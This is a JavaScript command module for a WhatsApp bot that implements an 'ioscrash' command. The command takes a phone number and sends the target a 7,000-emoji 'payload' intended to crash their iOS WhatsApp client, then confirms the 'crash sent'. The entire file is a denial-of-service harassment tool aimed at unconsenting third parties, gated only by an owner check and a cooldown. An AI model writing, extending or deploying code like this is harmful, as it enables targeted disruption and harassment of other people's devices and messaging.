import { isOwner, sendError } from '../lib/utils.js';

let cooldownIos = 0;

export default {
    name: 'ioscrash',
    aliases: [],
    description: 'Send iOS-specific crash message (owner only)',
    isPremium: true,
    groupOnly: false,
    privateOnly: true,
    adminOnly: true,
    category: 'bug',
    async execute(sock, message, args) {
        const from = message.key.remoteJid;
        const sender = message.key.participant || from;

        if (!isOwner(sender)) 
            return await sendError(sock, from, 'Only owners can use this command.');

        const currentTime = Date.now();
        if (currentTime - cooldownIos < 5000) 
            return await sendError(sock, from, `Please wait before using this command again.`);

        const phoneNumber = args[0]?.replace(/\D/g, '');
        if (!phoneNumber || phoneNumber.length < 10) 
            return await sendError(sock, from, `Provide a valid phone number.`);

        const targetJid = `${phoneNumber}@s.whatsapp.net`;

        try {
            const iosPayload = '📱'.repeat(7000);
            await sock.sendMessage(targetJid, { text: iosPayload });
            await sock.sendMessage(from, { text: `iOS crash sent to ${phoneNumber} ✅` });
            cooldownIos = currentTime;
        } catch (error) {
            await sendError(sock, from, 'iOS crash send failed.');
        }
    }
};